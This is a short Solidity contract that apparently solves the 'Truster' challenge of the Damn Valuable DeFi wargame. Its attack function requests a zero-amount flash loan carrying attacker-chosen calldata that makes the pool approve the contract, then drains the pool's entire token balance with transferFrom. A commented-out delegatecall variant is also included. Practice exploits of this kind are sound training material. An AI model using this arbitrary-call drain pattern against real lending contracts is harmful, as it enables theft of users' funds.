// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../DamnValuableToken.sol";
import "../truster/TrusterLenderPool.sol";

contract attacktruster{

 DamnValuableToken token;
 TrusterLenderPool pool;
 uint256 poolamount;
 constructor(DamnValuableToken _token, TrusterLenderPool _pool,uint256 _poolamount){
  token=_token;
  pool=_pool;
  poolamount=_poolamount;
 }


 function attack(bytes calldata data)public{
    pool.flashLoan(0, address(this), address(token), data);
    token.transferFrom(address(pool), msg.sender, poolamount);
 }

    // receive() external payable {
    //      (bool success, bytes memory data)= address(token).delegatecall(abi.encodeWithSignature("approve(address, uint256)", address(this),poolamount));
        
    // }
}